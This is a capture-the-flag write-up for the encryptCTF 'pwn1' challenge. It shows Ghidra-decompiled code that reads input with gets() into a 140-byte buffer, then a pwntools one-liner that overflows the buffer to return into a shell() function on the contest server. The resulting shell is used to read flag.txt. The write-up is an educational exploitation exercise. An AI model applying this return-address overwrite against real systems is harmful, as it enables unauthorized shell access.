# pwn1
Pwn

## Challenge 
Let's do some real stack buffer overflow

nc 104.154.106.182 2345

author: codacker

## Solution

Decompile in Ghidra

	undefined4 main(void){
	  char local_90 [140];
	  setvbuf(stdout,(char *)0x0,2,0);
	  printf("Tell me your name: ");
	  gets(local_90);
	  printf("Hello, %s\n",local_90);
	  return 0;
	}

	void shell(void){
	  system("/bin/bash");
	  return;
	}

There is a suspicious function called shell()

Simply return to address.

- Fill buffer with 140 bytes
- Then override the return address

Flag

	# (python -c 'from pwn import *; print cyclic(140) + p32(0x080484ad)'; cat) 
	| nc 104.154.106.182 2345
	
	Tell me your name: Hello, aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaab??
	
	ls
		flag.txt
		pwn1
	cat flag.txt
		encryptCTF{Buff3R_0v3rfl0W5_4r3_345Y}

## Flag

	encryptCTF{Buff3R_0v3rfl0W5_4r3_345Y}
